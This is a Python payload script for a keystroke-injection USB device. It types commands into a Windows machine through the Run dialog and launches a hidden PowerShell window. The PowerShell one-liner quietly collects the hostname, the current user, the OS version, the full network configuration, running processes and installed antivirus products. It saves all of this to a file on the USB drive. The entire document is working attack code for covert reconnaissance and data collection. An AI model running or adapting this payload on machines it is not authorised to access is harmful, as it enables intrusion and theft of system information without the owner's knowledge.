#!/usr/bin/env python3
import os, sys, time
from hid_type import win_r, type_string
from payload_utils import find_msd_drive_letter

def main():
    print("[*] Starting system info enumeration...")

    drive = find_msd_drive_letter(default="E:")
    outfile = f"{drive}\\sysinfo.txt"

    win_r(); time.sleep(0.5)
    type_string("powershell\n")
    time.sleep(1.0)
    cmd = rf"""
$OutFile = "{outfile}"
"=== System Info ===" | Out-File -FilePath $OutFile
hostname | Out-File -FilePath $OutFile -Append
whoami | Out-File -FilePath $OutFile -Append
Get-WmiObject Win32_OperatingSystem | Select Caption,Version | Format-List | Out-File -FilePath $OutFile -Append
"=== IP Config ===" | Out-File -FilePath $OutFile -Append
ipconfig /all | Out-File -FilePath $OutFile -Append
"=== Running Processes ===" | Out-File -FilePath $OutFile -Append
Get-Process | Out-File -FilePath $OutFile -Append
"=== Antivirus Products ===" | Out-File -FilePath $OutFile -Append
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath $OutFile -Append
"""
    one_liner = ";".join([l.strip() for l in cmd.strip().splitlines()])
    type_string(f"powershell -nop -w hidden -c \"{one_liner}\"\n")
    print("[+] Sysinfo payload sent.")

if __name__ == "__main__":
    main()
